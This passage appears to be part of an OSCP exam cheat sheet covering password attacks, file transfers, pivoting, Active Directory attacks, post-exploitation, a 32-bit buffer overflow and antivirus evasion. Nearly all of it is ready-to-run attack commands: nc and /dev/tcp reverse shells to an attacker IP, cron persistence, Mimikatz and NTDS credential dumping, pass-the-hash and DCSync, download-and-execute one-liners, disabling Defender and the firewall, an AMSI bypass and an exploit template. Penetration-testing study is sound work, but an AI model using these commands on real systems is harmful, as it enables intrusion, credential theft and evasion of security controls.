.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "nc.exe <IP> 4444 -e cmd"

:: RoguePotato
.\RoguePotato.exe -r <attacker_IP> -e "nc.exe <attacker_IP> 4444 -e cmd.exe" -l 9999

:: GodPotato (modern, works on most versions)
.\GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe <IP> 4444"
```

### Windows Passwords
```cmd
:: SAM database dump (requires admin/SYSTEM)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
:: Transfer to attacker and run:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

:: In-memory dump with Mimikatz
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::cache

:: Mimikatz one-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

:: Credential Manager
cmdkey /list
runas /savecred /user:<user> cmd.exe

:: In files
dir /s /b /a *.xml *.ini *.txt 2>nul | findstr /si "password"
findstr /si "password" *.xml *.ini *.txt
findstr /spin "password" *.*
```

---

## [OG-26] 23. Password Attacks

### Wordlists
```bash
# Default locations
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/                     # SecLists - massive collection
/usr/share/wordlists/metasploit/
/usr/share/dirb/wordlists/
/usr/share/dirbuster/wordlists/

# Generate wordlists
crunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
crunch 8 8 -t @@@@LLLL -o wordlist.txt   # @ = lowercase, L = uppercase, % = number

# CeWL — website wordlist
cewl http://<IP>/ -m 5 -d 3 -w cewl_wordlist.txt
cewl http://<IP>/ -m 5 --with-numbers -w cewl_wordlist.txt

# Mentalist / rules with hashcat
hashcat rules: /usr/share/hashcat/rules/
```

### Hashcat
```bash
# Identify hash
hashcat --identify hash.txt
hash-identifier <hash>

# Common hash modes
# 0    = MD5
# 100  = SHA1
# 1400 = SHA256
# 1800 = sha512crypt (Linux $6$)
# 500  = md5crypt (Linux $1$)
# 3200 = bcrypt
# 1000 = NTLM
# 5600 = NTLMv2
# 18200 = Kerberos AS-REP
# 13100 = Kerberos TGS
# 22921 = RSA/DSA/EC/OpenSSH private key

# Basic usage
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Brute force mask
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a?a  # All char, 8 len
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d  # Upper+lower+digits
# Masks: ?l=lower ?u=upper ?d=digit ?s=symbol ?a=all

# Combination
hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt

# Show cracked
hashcat -m 0 hash.txt --show
```

### John the Ripper
```bash
# Basic
john hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules

# Format specification
john hash.txt --format=nt                # NTLM
john hash.txt --format=sha512crypt       # Linux shadow $6$
john hash.txt --format=bcrypt
john hash.txt --format=raw-md5

# Show cracked
john --show hash.txt

# Extract hashes from files
zip2john file.zip > zip.hash
rar2john file.rar > rar.hash
pdf2john file.pdf > pdf.hash
ssh2john id_rsa > ssh.hash
keepass2john db.kdbx > keepass.hash
office2john document.docx > office.hash

# Then crack
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Hydra (Network Brute Force)
```bash
hydra -l user -p pass <IP> <service>    # Single user/pass
hydra -l user -P wordlist.txt <IP> <service>   # User + wordlist
hydra -L users.txt -P wordlist.txt <IP> <service>   # Both lists
hydra -C creds.txt <IP> <service>       # user:pass format

# Services
hydra -l admin -P rockyou.txt ssh://<IP>
hydra -l admin -P rockyou.txt ftp://<IP>
hydra -l admin -P rockyou.txt http-get://<IP>/admin/
hydra -l admin -P rockyou.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid password"
hydra -l admin -P rockyou.txt mysql://<IP>
hydra -l admin -P rockyou.txt rdp://<IP>
hydra -l admin -P rockyou.txt smtp://<IP>
hydra -l admin -P rockyou.txt pop3://<IP>
hydra -l admin -P rockyou.txt imap://<IP>
hydra -l admin -P rockyou.txt smb://<IP>

# Useful flags
-t 4                                    # 4 threads (SSH)
-t 16                                   # 16 threads
-f                                      # Stop after first found
-V                                      # Verbose
-s <port>                               # Non-standard port
-o output.txt                           # Save results
```

---

## [OG-27] 24. File Transfers

### Linux → Linux
```bash
# Python HTTP server
python3 -m http.server 80
python2 -m SimpleHTTPServer 80

# Download on target
wget http://<IP>/file.txt
curl http://<IP>/file.txt -o file.txt
curl http://<IP>/file.txt > file.txt
fetch http://<IP>/file.txt              # BSD

# Netcat transfer
# Receiver:
nc -lvnp 4444 > received_file
# Sender:
nc <IP> 4444 < file_to_send

# SCP
scp file.txt user@<IP>:/tmp/
scp user@<IP>:/tmp/file.txt ./

# Base64
# Sender:
base64 -w 0 file.bin && echo           # Copy output
# Receiver:
echo "BASE64_ENCODED" | base64 -d > file.bin
```

### Windows File Transfers
```powershell
# PowerShell download
(New-Object System.Net.WebClient).DownloadFile("http://<IP>/shell.exe", "C:\temp\shell.exe")
Invoke-WebRequest -Uri "http://<IP>/shell.exe" -OutFile "C:\temp\shell.exe"
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')
iwr http://<IP>/shell.exe -o C:\temp\shell.exe

# Certutil
certutil.exe -urlcache -split -f "http://<IP>/shell.exe" shell.exe
certutil.exe -decode encoded.b64 shell.exe

# BitsAdmin
bitsadmin /transfer job /download /priority high http://<IP>/shell.exe C:\temp\shell.exe

# SMB transfer
# Set up server on attacker:
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -username user -password pass
# Copy on target:
copy \\<IP>\share\shell.exe C:\temp\shell.exe
xcopy \\<IP>\share\shell.exe C:\temp\

# Meterpreter
upload /local/file.exe C:\\temp\\file.exe
download C:\\temp\\file.txt /local/
```

### Windows Command Download
```cmd
:: PowerShell one-liner
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe','C:\temp\nc.exe')"

:: CMD — download via VBS script
echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP") > dl.vbs
echo objXMLHTTP.open "GET","http://<IP>/shell.exe",false >> dl.vbs
echo objXMLHTTP.send() >> dl.vbs
echo If objXMLHTTP.Status=200 Then >> dl.vbs
echo Set objADOStream=CreateObject("ADODB.Stream") >> dl.vbs
echo objADOStream.Open >> dl.vbs
echo objADOStream.Type=1 >> dl.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> dl.vbs
echo objADOStream.SaveToFile "C:\temp\shell.exe" >> dl.vbs
echo objADOStream.Close >> dl.vbs
echo Set objADOStream=Nothing >> dl.vbs
echo End if >> dl.vbs
cscript //nologo dl.vbs
```

---

## [OG-28] 25. Pivoting & Tunneling

### SSH Tunneling (Revisited)
```bash
# SOCKS proxy via SSH
ssh -D 1080 -N user@<pivot>              # Dynamic SOCKS5

# Proxychains config
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 192.168.2.0/24
proxychains curl http://192.168.2.10/
proxychains evil-winrm -i 192.168.2.10 -u admin -p pass
```

### Chisel
```bash
# Download chisel
# https://github.com/jpillora/chisel/releases

# SOCKS proxy
# Attacker (server):
chisel server -p 8080 --reverse

# Target (client):
chisel client <attacker_IP>:8080 R:socks
# Use proxychains with socks5 127.0.0.1 1080

# Port forward
# Attacker:
chisel server -p 8080 --reverse
# Target:
chisel client <attacker_IP>:8080 R:3306:127.0.0.1:3306   # Forward target MySQL to attacker
```

### Plink (Windows)
```cmd
:: Windows to Linux pivot
plink.exe -ssh -l user -pw pass -R 4444:127.0.0.1:4444 <attacker_IP>
plink.exe -ssh -l user -pw pass -D 1080 <attacker_IP>
```

### socat Port Forward
```bash
# On pivot host — forward local 8080 to target 80
socat TCP4-LISTEN:8080,fork TCP4:<target_IP>:80

# Windows
socat.exe TCP4-LISTEN:8080,fork TCP4:<target_IP>:80
```

### Ligolo-ng (OSCP Recommended)
```bash
# Setup
# Attacker: run proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Target: run agent
./agent -connect <attacker_IP>:11601 -ignore-cert

# In ligolo console:
session                                  # Select session
ifconfig                                 # Show routes
start                                    # Start tunnel

# Add route on attacker
ip route add 192.168.2.0/24 dev ligolo

# Now direct access to internal network
nmap -sT 192.168.2.0/24
```

---

## [OG-29] 26. Active Directory Attacks

### Enumeration
```bash
# BloodHound data collection
bloodhound-python -u user -p pass -d domain.com -ns <DC_IP> -c all
bloodhound-python -u user -p pass -d domain.com -ns <DC_IP> -c DCOnly

# SharpHound (on Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --zipfilename output.zip

# Start BloodHound
neo4j start
bloodhound
# Import zip, run pre-built queries

# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetUser | select cn,description,badpwdcount
Get-NetGroup | select cn
Get-NetComputer
Get-NetGPO | select displayname
Find-LocalAdminAccess                    # Find machines where we're local admin
Get-DomainUser -SPN                      # Kerberoastable users
Get-DomainUser -PreauthNotRequired       # AS-REP roastable
Get-ObjectAcl -SamAccountName <user> -ResolveGUIDs  # ACL permissions

# CrackMapExec enumeration
crackmapexec smb <IP>/24 -u user -p pass --shares
crackmapexec smb <IP>/24 -u user -p pass -M gpp_autologin
crackmapexec smb <IP>/24 -u user -p pass -M gpp_password
crackmapexec ldap <IP> -u user -p pass --trusted-for-delegation
crackmapexec ldap <IP> -u user -p pass --password-not-required
```

### Pass the Hash
```bash
# Impacket
impacket-psexec -hashes :NTLMhash domain/user@<IP>
impacket-wmiexec -hashes :NTLMhash domain/user@<IP>
impacket-smbexec -hashes :NTLMhash domain/user@<IP>
impacket-atexec -hashes :NTLMhash domain/user@<IP> "whoami"

# CrackMapExec
crackmapexec smb <IP> -u user -H NTLMhash
crackmapexec smb <IP>/24 -u admin -H NTLMhash --local-auth

# Evil-WinRM (WinRM / port 5985)
evil-winrm -i <IP> -u user -H NTLMhash

# xfreerdp (RDP PtH)
xfreerdp /u:user /pth:NTLMhash /v:<IP> /cert:ignore
```

### DCSync
```bash
# Requires: Domain Admin, or GenericAll/ReplicatingDirectoryChanges* rights
impacket-secretsdump domain.com/admin:pass@<DC_IP>
impacket-secretsdump -hashes :NTLMhash domain.com/admin@<DC_IP>
impacket-secretsdump -just-dc-ntlm domain.com/admin:pass@<DC_IP>

# Mimikatz
lsadump::dcsync /user:krbtgt
lsadump::dcsync /domain:domain.com /all /csv
```

### ACL Abuse
```bash
# GenericAll on user → reset password
net rpc password <target_user> newpass123 -U domain/attacker_user%pass -S <DC_IP>
Set-DomainUserPassword -Identity <target_user> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# WriteDACL on domain → DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity attacker -Rights DCSync

# GenericAll on group → add user
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker

# ForceChangePassword
$SecPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <user> -AccountPassword $SecPassword
```

### Constrained / Unconstrained Delegation
```bash
# Find unconstrained delegation computers
Get-DomainComputer -Unconstrained | select dnshostname
crackmapexec ldap <DC_IP> -u user -p pass --trusted-for-delegation

# Find constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# S4U2Self / S4U2Proxy abuse
Rubeus.exe s4u /user:<machine$> /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt
```

### NTDS.dit Extraction
```bash
# Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Using ntdsutil
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds" quit quit

# Impacket remote
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

---

## [OG-30] 27. Post Exploitation

### Linux Post Exploitation
```bash
# Enumerate the box
cat /etc/passwd
cat /etc/shadow
cat /etc/group
cat /etc/hosts
cat /etc/resolv.conf
cat /etc/network/interfaces
cat /etc/crontab
cat /var/mail/root
ls -la /root
ls -la /home/*
ls -la /tmp
ls -la /var/tmp

# Installed software
dpkg -l
rpm -qa
pip freeze
gem list

# Dump hashes
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Persistence
echo "bash -i >& /dev/tcp/<IP>/4444 0>&1" >> /etc/crontab
echo "* * * * * root bash -i >& /dev/tcp/<IP>/4444 0>&1" >> /etc/crontab
# Add SSH key
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Dump browser data
find / -name "*.sqlite" 2>/dev/null | grep -i "firefox\|chrome"
find / -name "Login Data" 2>/dev/null                # Chrome logins
```

### Windows Post Exploitation
```cmd
:: System info
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
net users
net localgroup administrators
query user

:: Dump passwords
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

:: Extract browser creds
# LaZagne
.\lazagne.exe all
.\lazagne.exe browsers

:: Persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v shell /t REG_SZ /d "C:\temp\shell.exe" /f
schtasks /create /sc minute /mo 1 /tn "maintenance" /tr "C:\temp\shell.exe" /ru SYSTEM
net user hacker P@ss123 /add
net localgroup administrators hacker /add

:: Disable firewall
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off

:: Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true
sc stop WinDefend
```

---

## [OG-31] 28. Buffer Overflow (32-bit)

### Basic Workflow
```bash
# Step 1: Fuzzing — find the crash
python3 -c "print('A' * 1000)" | nc <IP> <port>

# Fuzzer script
import socket, sys, time
buffer = ["A"]
counter = 100
while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter += 100
for string in buffer:
    print(f"Fuzzing with {len(string)} bytes")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('<IP>', <port>))
    s.recv(1024)
    s.send((string + '\r\n').encode())
    s.close()
    time.sleep(1)
```

```bash
# Step 2: Find offset with pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
msf-pattern_create -l 3000

# Step 3: Find EIP offset
msf-pattern_offset -l 3000 -q <EIP_value>
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <EIP_value>

# Step 4: Confirm offset (EIP should be 42424242)
python3 -c "print('A' * <offset> + 'BBBB' + 'C' * 100)" | nc <IP> <port>

# Step 5: Find bad characters
# Generate byte array excluding null byte
python3 -c "
badchars = b''
for i in range(1, 256):
    badchars += bytes([i])
print(badchars)"
# Send with payload and compare in debugger to find bad chars

# Generate mona comparison (in Immunity Debugger / mona.py):
# !mona bytearray -b "\x00"
# After crash: !mona compare -f C:\mona\bytearray.bin -a <ESP_address>

# Step 6: Find JMP ESP
# In Immunity Debugger:
# !mona modules              (find module without protections)
# !mona find -s "\xff\xe4" -m <module_without_ASLR>
# Or use msfpescan:
msfpescan -j esp <dll_file>
nasm_shell.rb
JMP ESP → \xff\xe4

# Step 7: Generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00\x0a\x0d" -f python -v shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00" -f python -v shellcode

# Step 8: Final exploit
offset = <found_offset>
payload  = b"A" * offset
payload += b"\xXX\xXX\xXX\xXX"         # JMP ESP address (little-endian)
payload += b"\x90" * 16                 # NOP sled
payload += shellcode
```

### OSCP BOF Template (Python3)
```python
import socket, sys

ip = "<TARGET_IP>"
port = <TARGET_PORT>
offset = 0                               # Adjust after finding
overflow = "A" * offset
retn = ""                                # JMP ESP address (little-endian)
padding = "\x90" * 16                   # NOP sled
payload = ""                             # msfvenom output here
postfix = ""
buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except Exception as e:
    print(f"Could not connect: {e}")
```

---

## [OG-32] 29. Antivirus Evasion

### Techniques
```bash
# Encode with msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 15 -f exe > encoded.exe

# Shellter (inject into legit PE)
shellter
# Select auto mode, choose target PE, inject payload

# Veil-Evasion
veil
use 1                                    # Use Evasion
list
use python/meterpreter/rev_tcp.py

# Phantom-Evasion / IKEEXT / custom code
# Compile C shellcode runner
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f c -b "\x00"
# Embed in C runner and compile with mingw

# Use powershell to load in-memory (avoid disk)
# AMSI bypass:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Base64 PowerShell to avoid keyword detection
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://<IP>/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $enc
```

---

## [OG-33] 30. Useful One-Liners & Miscellaneous

### Quick Wins
```bash
# Check for password reuse across services
crackmapexec smb <IP>/24 -u users.txt -p passwords.txt --continue-on-success

# Generate all payloads at once
for port in 4444 4445 4446; do msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=$port -f exe > shell_$port.exe; done

# Find files modified in last 24h
find / -mtime -1 -type f 2>/dev/null

# Find SUID and run against GTFOBins
find / -perm -4000 -type f 2>/dev/null | xargs -I {} sh -c 'echo "=== {} ===" && ls -la {}'

# Quick web shell test
curl "http://<IP>/shell.php?cmd=id"
curl "http://<IP>/shell.php?cmd=whoami"
curl "http://<IP>/shell.php?cmd=cat%20/etc/passwd"

# Ping sweep one-liner
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" & done

# Port scan without nmap
for port in 21 22 23 25 53 80 110 139 143 443 445 3306 3389; do (echo >/dev/tcp/192.168.1.1/$port) 2>/dev/null && echo "$port open"; done
```

### Netcat Tricks
```bash
# Chat
nc -lvnp 4444                           # Listener
nc <IP> 4444                            # Connect

# File transfer
nc -lvnp 4444 > received.txt            # Receiver
nc <IP> 4444 < file.txt                 # Sender

# Bind shell
nc -lvnp 4444 -e /bin/bash             # Linux bind
nc -lvnp 4444 -e cmd.exe               # Windows bind
nc <IP> 4444                            # Connect to bind shell

# HTTP request
printf "GET / HTTP/1.0\r\n\r\n" | nc <IP> 80

# Port scan
nc -zv <IP> 20-1000 2>&1 | grep succeeded
```

### Interesting File Locations
```bash
# Linux
/etc/passwd             # Users
/etc/shadow             # Hashes
/etc/sudoers            # Sudo rules
/etc/crontab            # Cron jobs
/etc/hosts              # DNS entries
/etc/ssh/sshd_config    # SSH config
/var/log/auth.log       # Auth logs
/var/log/syslog         # System logs
/home/*/.ssh/           # SSH keys
/home/*/.bash_history   # Bash history
/root/.bash_history     # Root history
/var/www/html/          # Web files
/proc/version           # Kernel
/proc/sched_debug       # Processes

# Windows
C:\Windows\System32\config\SAM               # SAM hashes
C:\Windows\System32\config\SYSTEM            # System hive
C:\Windows\repair\SAM                        # Backup SAM
C:\WINDOWS\System32\drivers\etc\hosts        # Hosts file
C:\Users\*\AppData\Local\Google\Chrome\...  # Chrome data
C:\Users\*\AppData\Roaming\Mozilla\...      # Firefox data
C:\inetpub\wwwroot\                          # Web root
C:\xampp\htdocs\                             # XAMPP
%WINDIR%\Panther\Unattend.xml                # Unattended install
%WINDIR%\Panther\Unattended.xml
%WINDIR%\System32\sysprep\sysprep.xml
%WINDIR%\System32\sysprep\Unattend.xml
C:\sysprep\sysprep.xml
```

### MSFConsole Essentials
```bash
msfconsole
search <term>                           # Search modules
use <module>                            # Use module
info                                    # Module info
show options                            # Show options
show payloads                           # Show compatible payloads
set <option> <value>
setg <option> <value>                   # Set globally
run / exploit
sessions                                # List sessions
sessions -i <id>                        # Interact with session
sessions -u <id>                        # Upgrade to Meterpreter
background                              # Background session
```

### Meterpreter Essentials
```bash
sysinfo
getuid
getpid
getsystem                               # Attempt privesc
hashdump                                # Dump hashes
shell                                   # Drop to shell
upload file.exe C:\\temp\\
download C:\\temp\\file.txt ./
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
run post/linux/gather/enum_configs
run post/linux/gather/enum_network
portfwd add -l 3306 -p 3306 -r 127.0.0.1  # Port forward
route add 192.168.2.0/24 <session_id>   # Add route
```

### ProxyChains Setup
```bash
# /etc/proxychains4.conf
# Comment out: proxy_dns
# Add at bottom:
socks5 127.0.0.1 1080

# Usage
proxychains nmap -sT -Pn -n 192.168.2.0/24
proxychains curl http://192.168.2.10/
proxychains evil-winrm -i 192.168.2.10 -u admin -p pass
proxychains impacket-psexec domain/user:pass@192.168.2.10
```

### Common OSCP Report Tools
```bash
# Screenshots
flameshot gui                           # Screenshot tool

# Take notes
# Recommended: Obsidian / CherryTree / Notion

# Proof files
cat /root/proof.txt                     # Linux root flag
type C:\Users\Administrator\Desktop\proof.txt    # Windows
```

---

> **Remember:** Always document your steps. Take screenshots. Note exact commands used.  
> For OSCP exam: `ifconfig` or `ipconfig` in each proof screenshot is required.

---
